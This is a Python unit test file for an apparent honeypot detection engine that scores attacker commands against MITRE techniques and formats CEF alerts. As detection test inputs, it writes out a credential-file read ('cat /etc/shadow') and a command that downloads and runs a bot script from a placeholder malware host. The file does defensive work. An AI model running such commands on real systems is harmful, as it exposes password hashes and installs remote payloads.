"""
Unit tests for Python Intelligence Layer
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from behavioral_analyzer import BehavioralAnalyzer, MITRETechnique
from alert_dispatcher import AlertDispatcher


class TestBehavioralAnalyzer(unittest.TestCase):
    def setUp(self):
        self.analyzer = BehavioralAnalyzer()
        self.session_id = "test-session-001"
        self.analyzer.init_session(self.session_id, "192.0.2.1", 54321, "TELNET")

    def test_benign_commands(self):
        res = self.analyzer.analyze_command(self.session_id, "whoami")
        self.assertIn(MITRETechnique.T1033_SYSTEM_OWNER, res["detected_techniques"])
        self.assertLess(res["threat_score"], 3.0)

    def test_exploit_commands(self):
        res = self.analyzer.analyze_command(self.session_id, "cat /etc/shadow")
        self.assertIn(MITRETechnique.T1003_CRED_DUMPING, res["detected_techniques"])
        self.assertGreater(res["threat_score"], 3.0)

        res2 = self.analyzer.analyze_command(self.session_id, "wget http://malware.site/bot.sh; chmod +x bot.sh; ./bot.sh")
        self.assertIn(MITRETechnique.T1105_INGRESS_TOOL, res2["detected_techniques"])
        self.assertGreaterEqual(res2["threat_score"], 7.0)

    def test_human_vs_bot_transition(self):
        self.analyzer.update_profile(self.session_id, {
            "client_type": "HUMAN_INTERACTIVE",
            "confidence_score": 0.95,
        })
        state = self.analyzer.session_states[self.session_id]
        self.assertGreater(state["human_confidence"], 0.8)


class TestAlertDispatcher(unittest.TestCase):
    def setUp(self):
        self.test_log_dir = "logs/test_logs"
        self.dispatcher = AlertDispatcher(log_dir=self.test_log_dir)

    def tearDown(self):
        import shutil
        if os.path.exists(self.test_log_dir):
            shutil.rmtree(self.test_log_dir)

    def test_cef_format(self):
        cef = self.dispatcher._format_cef("SHOCK_TRIGGERED", {
            "remote_ip": "198.51.100.99",
            "remote_port": 49152,
            "port": 2222,
            "session_id": "test-cef-session",
            "threat_score": 8,
            "payload": "Shock dispatched",
        })
        self.assertIn("CEF:0|Chameleon-Security|DeceptionEngine|2.4.0|SHOCK_TRIGGERED", cef)
        self.assertIn("src=198.51.100.99", cef)
        self.assertIn("dpt=2222", cef)


if __name__ == "__main__":
    unittest.main()
